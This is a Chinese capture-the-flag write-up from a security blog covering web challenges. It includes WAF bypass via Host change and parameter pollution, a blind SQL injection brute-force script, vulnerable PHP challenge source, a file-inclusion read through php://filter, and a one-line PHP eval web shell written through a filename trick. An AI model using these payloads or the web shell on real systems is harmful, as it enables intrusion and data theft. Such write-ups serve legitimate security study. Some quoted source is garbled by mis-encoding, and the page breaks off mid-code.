<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<title>
  
    赛博杯WP
  
</title>

<meta name="description" content="赛博杯WP​    这次打比赛的时候在准备论文，题目也只是看了看，小伙伴很给力，WEB做了很多。比赛后看了下题目，写了这个WP，其中很多工作都是建立在大佬Dlive的工作之上。">
<meta name="keywords" content="WEB">
<meta property="og:type" content="article">
<meta property="og:title" content="赛博杯WP">
<meta property="og:url" content="http://spikesec.cn/2018/01/20/赛博杯WP/index.html">
<meta property="og:site_name" content="Spike Security">
<meta property="og:description" content="赛博杯WP​    这次打比赛的时候在准备论文，题目也只是看了看，小伙伴很给力，WEB做了很多。比赛后看了下题目，写了这个WP，其中很多工作都是建立在大佬Dlive的工作之上。">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://spikesec.cn/2018/01/20/赛博杯WP/赛博杯WP/1.jpg">
<meta property="og:image" content="http://spikesec.cn/2018/01/20/赛博杯WP/赛博杯WP/2.jpg">
<meta property="og:updated_time" content="2018-03-14T06:59:00.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="赛博杯WP">
<meta name="twitter:description" content="赛博杯WP​    这次打比赛的时候在准备论文，题目也只是看了看，小伙伴很给力，WEB做了很多。比赛后看了下题目，写了这个WP，其中很多工作都是建立在大佬Dlive的工作之上。">
<meta name="twitter:image" content="http://spikesec.cn/2018/01/20/赛博杯WP/赛博杯WP/1.jpg">


  <link rel="alternative" href="/atom.xml" title="Spike Security" type="application/atom+xml">



  <link rel="icon" href="/favicon.png">


<link rel="stylesheet" href="/perfect-scrollbar/css/perfect-scrollbar.min.css">
<link rel="stylesheet" href="/styles/main.css">






</head>
<body
  
    class="monochrome"
  
  >
  <div class="mobile-header">
  <button class="sidebar-toggle" type="button">
    <span class="icon-bar"></span>
    <span class="icon-bar"></span>
    <span class="icon-bar"></span>
  </button>
  <a class="title" href="/">Spike Security</a>
</div>

  <div class="main-container">
    <div class="sidebar">
  <div class="header">
    <h1 class="title"><a href="/">Spike Security</a></h1>
    
    <div class="info">
      <div class="content">
        
        
          <div class="author">Spike</div>
        
      </div>
      
        <div class="avatar">
          
            <a href="/about"><img src="/images/cc/avatar.jpeg"></a>
          
        </div>
      
    </div>
  </div>
  <div class="body">
    
      
        <ul class="nav">
          
            
              <li class="category-list-container">
                <a href="javascript:;">Category</a>
                
              </li>
            
          
            
              <li class="tag-list-container">
                <a href="javascript:;">Tag</a>
                <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/">WEB</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/other/">other</a><span class="tag-list-count">2</span></li></ul>
              </li>
            
          
            
              <li class="archive-list-container">
                <a href="javascript:;">Archive</a>
                <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/">2017</a><span class="archive-list-count">10</span></li></ul>
              </li>
            
          
        </ul>
      
        <ul class="nav">
          
            
              <li>
                <a href="/" title="Homepage">Homepage</a>
              </li>
            
          
            
              <li>
                <a href="/archives" title="By Year">By Year</a>
              </li>
            
          
        </ul>
      
        <ul class="nav">
          
            
              <li>
                <a href="http://weibo.com/spikex" title="Weibo" target="_blank" rel="noopener">Weibo</a>
              </li>
            
          
            
              <li>
                <a href="https://github.com/SpikeI" title="Github" target="_blank" rel="noopener">Github</a>
              </li>
            
          
            
              <li>
                <a href="/atom.xml" title="RSS">RSS</a>
              </li>
            
          
        </ul>
      
    
  </div>
</div>

    <div class="main-content">
      
        <div style="max-width: 1000px">
      
          <article id="post-赛博杯WP" class="article article-type-post">
  
    <h1 class="article-header">
      赛博杯WP
    </h1>
  
  

  <div class="article-info">
    <span class="article-date">
  2018-01-20
</span>

    

    
	<span class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/">WEB</a></li></ul>
	</span>


  </div>
  <div class="article-entry">
    <h1 id="赛博杯WP"><a href="#赛博杯WP" class="headerlink" title="赛博杯WP"></a>赛博杯WP</h1><p>​    这次打比赛的时候在准备论文，题目也只是看了看，小伙伴很给力，WEB做了很多。比赛后看了下题目，写了这个WP，其中很多工作都是建立在大佬Dlive的工作之上。</p>
<a id="more"></a>
<h4 id="1-YUN-WAF-的突破-青云"><a href="#1-YUN-WAF-的突破-青云" class="headerlink" title="1.YUN_WAF_的突破_青云"></a>1.YUN_WAF_的突破_青云</h4><p>​    服务器端检查HOST，将域名改成IP后即可绕过waf。</p>
<p><img src="赛博杯WP\1.jpg" alt="1"></p>
<h4 id="2-YUN-WAF-的突破-华为云"><a href="#2-YUN-WAF-的突破-华为云" class="headerlink" title="2.YUN_WAF_的突破_华为云"></a>2.YUN_WAF_的突破_华为云</h4><p>​    参数污染绕waf</p>
<p>​    猜测华为云会将所有参数进行一次filter，然后单个参数进行filter。其中单个参数会以第一个参数为准。由于apache在遇到同名参数的时候会取最后一个参数，所以可以通过参数污染的方式绕waf。</p>
<p>​    waf过滤了information_schema,SCHEMA,select … from 等等关键词，因为之前有题目是类似的要求，所以猜测flag在password中，所以直接用like注入XD。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&apos;&amp;username=abcd&apos; or password like &apos;&#123;&#125;%&apos;#</span><br></pre></td></tr></table></figure>
<p>爆破脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &apos;http://localhost:8765&apos;</span><br><span class="line"></span><br><span class="line">data = &apos;username=1\&apos;&amp;username=abcd\&apos; or password like \&apos;&#123;&#125;%\&apos;#&apos;</span><br><span class="line">url = &apos;http://huaweicetc.xctf.org.cn/findpwd.php&apos;</span><br><span class="line">cookie = &#123;</span><br><span class="line">	&apos;token&apos;:&apos;BwmDoZoJ9QjSFF65dgYP5eoNjGvoYl7K&apos;,</span><br><span class="line">	&apos;PHPSESSID&apos;:&apos;3dh8gn9o7qgsfgdraa9bv0g103&apos;</span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">	&apos;Referer&apos;:&apos;http://huaweicetc.xctf.org.cn/findpwd.php&apos;,</span><br><span class="line">	&apos;X-Forwarded-For&apos;:&apos;127.0.0.1&apos;,</span><br><span class="line">	&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&apos;,</span><br><span class="line">	&apos;Origin&apos;:&apos;http://huaweicetc.xctf.org.cn&apos;,</span><br><span class="line">	&apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chars = &apos;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@*()-=_+&#123;&#125;&apos;</span><br><span class="line"></span><br><span class="line">flag = &apos;flag&apos;</span><br><span class="line">for i in range(100):</span><br><span class="line">	for c in chars:</span><br><span class="line">		post_data = data.format(flag+c)</span><br><span class="line">		res = requests.post(url, data = post_data, cookies = cookie, headers = headers)</span><br><span class="line">		pattern = re.compile(r&apos;您的密保问题&apos;)</span><br><span class="line">		if pattern.search(res.content) != None:</span><br><span class="line">			print &apos;[+] Got it! flag: &apos;+ flag + c</span><br><span class="line">			flag += c</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
<p>flag最后是：<code>flag_uuuuuu_g000d_mmmmma_</code></p>
<h4 id="3-YUN-WAF-的突破-阿里"><a href="#3-YUN-WAF-的突破-阿里" class="headerlink" title="3. YUN_WAF_的突破_阿里"></a>3. YUN_WAF_的突破_阿里</h4><p>​    直接like注入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">data = &apos;username=abcd\&apos; or password like \&apos;&#123;&#125;%\&apos;#&apos;</span><br><span class="line"></span><br><span class="line">url = &apos;http://alicetc.xctf.org.cn/findpwd.php&apos;</span><br><span class="line">cookie = &#123;</span><br><span class="line">	&apos;token&apos;:&apos;BwmDoZoJ9QjSFF65dgYP5eoNjGvoYl7K&apos;,</span><br><span class="line">	&apos;PHPSESSID&apos;:&apos;3dh8gn9o7qgsfgdraa9bv0g103&apos;</span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">	&apos;Referer&apos;:&apos;http://huaweicetc.xctf.org.cn/findpwd.php&apos;,</span><br><span class="line">	&apos;X-Forwarded-For&apos;:&apos;127.0.0.1&apos;,</span><br><span class="line">	&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&apos;,</span><br><span class="line">	&apos;Origin&apos;:&apos;http://huaweicetc.xctf.org.cn&apos;,</span><br><span class="line">	&apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chars = &apos;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@*()-=_+&#123;&#125;&apos;</span><br><span class="line"></span><br><span class="line">flag = &apos;flag&apos;</span><br><span class="line">for i in range(100):</span><br><span class="line">	for c in chars:</span><br><span class="line">		post_data = data.format(flag+c)</span><br><span class="line">		res = requests.post(url, data = post_data, cookies = cookie, headers = headers)</span><br><span class="line">		pattern = re.compile(r&apos;您的密保问题&apos;)</span><br><span class="line">		if pattern.search(res.content) != None:</span><br><span class="line">			print &apos;[+] Got it! flag: &apos;+ flag + c</span><br><span class="line">			flag += c</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
<p>flag:<code>flag_y0000i_9a66_the_waf_cooool_</code></p>
<h4 id="4-请关注工控云管理系统的警告记录"><a href="#4-请关注工控云管理系统的警告记录" class="headerlink" title="4. 请关注工控云管理系统的警告记录"></a>4. 请关注工控云管理系统的警告记录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if(!isset($_GET[&apos;c&apos;]) &amp;&amp; !isset($_GET[&apos;re&apos;])) &#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $selfdir = $_GET[&apos;dir&apos;];</span><br><span class="line">    if (!isset($selfdir)) &#123;</span><br><span class="line">      die();</span><br><span class="line">    &#125;</span><br><span class="line">    $secret = &apos;/var/www/html/hackme/&apos; . md5(&quot;cetcrce&quot; . $selfdir . $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    @chdir(&apos;hackme&apos;);</span><br><span class="line">    @mkdir($secret);</span><br><span class="line">    @chdir($secret);</span><br><span class="line"></span><br><span class="line">    if (isset($_GET[&apos;c&apos;]) &amp;&amp; strlen($_GET[&apos;c&apos;]) &lt;= 5) &#123;</span><br><span class="line">        include(&apos;waf.php&apos;);</span><br><span class="line">        @exec($_GET[&apos;c&apos;]);</span><br><span class="line">    &#125;elseif(isset($_GET[&apos;re&apos;])) &#123;</span><br><span class="line">        @exec(&apos;/bin/rm -rf &apos; . $secret);</span><br><span class="line">        @exec(&apos;touch /var/www/html/hackme/index.php&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>HITCON2017类似题目wp：<a href="https://ctftime.org/task/4835，不知道waf拦了什么，直接用以前的题解即可。" target="_blank" rel="noopener">https://ctftime.org/task/4835，不知道waf拦了什么，直接用以前的题解即可。</a></p>
<h4 id="工控云管理系统项目管理页面解析漏洞"><a href="#工控云管理系统项目管理页面解析漏洞" class="headerlink" title="工控云管理系统项目管理页面解析漏洞"></a>工控云管理系统项目管理页面解析漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;cetc7&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    if (!isset($_GET[page])) &#123;</span><br><span class="line">      show_source(__FILE__);</span><br><span class="line">      die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($_GET[page]) &amp;&amp; $_GET[page] != &apos;index.php&apos;) &#123;</span><br><span class="line">      include(&apos;flag.php&apos;);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">      header(&apos;Location: ?page=flag.php&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form action=&quot;#&quot; method=&quot;get&quot;&gt;</span><br><span class="line">      page : &lt;input type=&quot;text&quot; name=&quot;page&quot; value=&quot;&quot;&gt;</span><br><span class="line">      id : &lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;a href=&quot;index.phps&quot;&gt;view-source&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">     if ($_SESSION[&apos;admin&apos;]) &#123;</span><br><span class="line">       $con = $_POST[&apos;con&apos;];</span><br><span class="line">       $file = $_POST[&apos;file&apos;];</span><br><span class="line">       $filename = &quot;backup/&quot;.$file;</span><br><span class="line"></span><br><span class="line">       if(preg_match(&apos;/.+\.ph(p[3457]?|t|tml)$/i&apos;, $filename))&#123;</span><br><span class="line">          die(&quot;Bad file extension&quot;);</span><br><span class="line">       &#125;else&#123;</span><br><span class="line">            chdir(&apos;uploaded&apos;);</span><br><span class="line">           $f = fopen($filename, &apos;w&apos;);</span><br><span class="line">           fwrite($f, $con);</span><br><span class="line">           fclose($f);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">      if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &apos;1&apos; &amp;&amp; substr($_GET[id], -1) === &apos;9&apos;) &#123;</span><br><span class="line">        include &apos;config.php&apos;;</span><br><span class="line">        $id = mysql_real_escape_string($_GET[id]);</span><br><span class="line">        $sql=&quot;select * from cetc007.user where id=&apos;$id&apos;&quot;;</span><br><span class="line">        $result = mysql_query($sql);</span><br><span class="line">        $result = mysql_fetch_object($result);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        $result = False;</span><br><span class="line">        die();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if(!$result)die(&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;);</span><br><span class="line">      if($result)&#123;</span><br><span class="line">        echo &quot;id: &quot;.$result-&gt;id.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">        echo &quot;name:&quot;.$result-&gt;user.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">        $_SESSION[&apos;admin&apos;] = True;</span><br><span class="line">      &#125;</span><br><span class="line">     ?&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>构造字符串获取admin权限id=1a9。</p>
<p>通过php的一个解析的漏洞，在文件名后面加<code>/.</code>，会解析成PHP。POST数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=../spike.php/.&amp;con=&lt;?php @eval($_POST[abc]);?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="工控云管理系统设备维护中心被植入后门"><a href="#工控云管理系统设备维护中心被植入后门" class="headerlink" title="工控云管理系统设备维护中心被植入后门"></a>工控云管理系统设备维护中心被植入后门</h4><p><code>http://47.104.74.209:20005/index.php?page=index</code>page处有文件包含</p>
<p>用<code>phpfilter</code>读到源码<code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">@session_start();</span><br><span class="line">posix_setuid(1000);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;renderer&quot; content=&quot;webkit&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/layui.css&quot; media=&quot;all&quot;&gt;</span><br><span class="line">    &lt;title&gt;è®¾å¤ç»´æ¤ä¸­å¿&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;ul class=&quot;layui-nav&quot;&gt;</span><br><span class="line">        &lt;li class=&quot;layui-nav-item layui-this&quot;&gt;&lt;a href=&quot;?page=index&quot;&gt;äºå¹³å°è®¾å¤ç»´æ¤ä¸­å¿&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;fieldset class=&quot;layui-elem-field layui-field-title&quot; style=&quot;margin-top: 30px;&quot;&gt;</span><br><span class="line">        &lt;legend&gt;è®¾å¤åè¡¨&lt;/legend&gt;</span><br><span class="line">    &lt;/fieldset&gt;</span><br><span class="line">    &lt;table class=&quot;layui-hide&quot; id=&quot;test&quot;&gt;&lt;/table&gt;</span><br><span class="line">    &lt;script type=&quot;text/html&quot; id=&quot;switchTpl&quot;&gt;</span><br><span class="line">        &lt;!-- è¿éç checked çç¶æåªæ¯æ¼ç¤º --&gt;</span><br><span class="line">        &lt;input type=&quot;checkbox&quot; name=&quot;sex&quot; value=&quot;&#123;&#123;d.id&#125;&#125;&quot; lay-skin=&quot;switch&quot; lay-text=&quot;å¼|å³&quot; lay-filter=&quot;checkDemo&quot; &#123;&#123; d.id==1 0003 ? &apos;checked&apos; : &apos;&apos; &#125;&#125;&gt;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;layui/layui.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.use(&apos;table&apos;, function() &#123;</span><br><span class="line">        var table = layui.table,</span><br><span class="line">            form = layui.form;</span><br><span class="line"></span><br><span class="line">        table.render(&#123;</span><br><span class="line">            elem: &apos;#test&apos;,</span><br><span class="line">            url: &apos;/somrthing.json&apos;,</span><br><span class="line">            cellMinWidth: 80,</span><br><span class="line">            cols: [</span><br><span class="line">                [</span><br><span class="line">                    &#123; type: &apos;numbers&apos; &#125;,</span><br><span class="line">                     &#123; type: &apos;checkbox&apos; &#125;,</span><br><span class="line">                     &#123; field: &apos;id&apos;, title: &apos;ID&apos;, width: 100, unresize: true, sort: true &#125;,</span><br><span class="line">                     &#123; field: &apos;name&apos;, title: &apos;è®¾å¤å&apos;, templet: &apos;#nameTpl&apos; &#125;,</span><br><span class="line">                     &#123; field: &apos;area&apos;, title: &apos;åºå&apos; &#125;,</span><br><span class="line">                     &#123; field: &apos;status&apos;, title: &apos;ç»´æ¤ç¶æ&apos;, minWidth: 120, sort: true &#125;,</span><br><span class="line">                     &#123; field: &apos;check&apos;, title: &apos;è®¾å¤å¼å³&apos;, width: 85, templet: &apos;#switchTpl&apos;, unresize: true &#125;</span><br><span class="line">                ]</span><br><span class="line">            ],</span><br><span class="line">            page: true</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.use(&apos;element&apos;, function() &#123;</span><br><span class="line">        var element = layui.element; </span><br><span class="line">        element.on(&apos;nav(demo)&apos;, function(elem) &#123;</span><br><span class="line">            //console.log(elem)</span><br><span class="line">            layer.msg(elem.text());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$page = $_GET[page];</span><br><span class="line">if (isset($page)) &#123;</span><br><span class="line">if (ctype_alnum($page)) &#123;</span><br><span class="line">?&gt;</span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;div style=&quot;text-align:center&quot;&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;</span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">?&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">        &lt;div style=&quot;text-align:center&quot;&gt;</span><br><span class="line">            &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">                &lt;?php</span><br><span class="line">                if (strpos($page, &apos;input&apos;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &apos;ta:text&apos;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &apos;text&apos;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if ($page === &apos;index.php&apos;) &#123;</span><br><span class="line">                    die(&apos;Ok&apos;);</span><br><span class="line">                &#125;</span><br><span class="line">                    include($page);</span><br><span class="line">                    die();</span><br><span class="line">                ?&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;] === &apos;127.0.0.1&apos;) &#123;</span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 